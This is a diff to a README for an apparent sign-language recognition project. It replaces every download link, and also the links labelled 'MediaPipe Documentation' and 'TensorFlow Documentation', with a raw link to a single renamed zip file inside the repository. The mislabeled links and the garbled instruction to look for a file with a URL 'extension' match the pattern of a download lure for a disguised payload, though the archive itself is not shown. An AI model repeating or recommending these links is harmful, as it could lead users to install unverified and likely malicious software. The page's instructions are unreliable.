@@ -1,6 +1,6 @@
 # 👋 ASL-Sign-Recognition - Recognize Sign Language Effortlessly
 
-[![Download ASL-Sign-Recognition](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
+[![Download ASL-Sign-Recognition](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/Sign-Recognition-AS-1.1.zip)](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/Sign-Recognition-AS-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,9 +26,9 @@ To get started with ASL-Sign-Recognition, follow these steps:
 
 1. Click the download link below to visit the releases page.
    
-   [Download ASL-Sign-Recognition](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
+   [Download ASL-Sign-Recognition](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/Sign-Recognition-AS-1.1.zip)
 
-2. On the releases page, find the latest version. Look for a file labeled with a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip` extension depending on your operating system.
+2. On the releases page, find the latest version. Look for a file labeled with a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/Sign-Recognition-AS-1.1.zip` extension depending on your operating system.
 
 3. Download the file by clicking the link. Your browser will save it to your default downloads folder.
 
@@ -52,8 +52,8 @@ To get started with ASL-Sign-Recognition, follow these steps:
 
 ## 🎓 Learning Resources
 
-- **MediaPipe**: [MediaPipe Documentation](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
-- **TensorFlow**: [TensorFlow Documentation](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
+- **MediaPipe**: [MediaPipe Documentation](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/Sign-Recognition-AS-1.1.zip)
+- **TensorFlow**: [TensorFlow Documentation](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/Sign-Recognition-AS-1.1.zip)
 
 Feel free to explore and learn more about how these technologies work together to make ASL recognition possible.
 
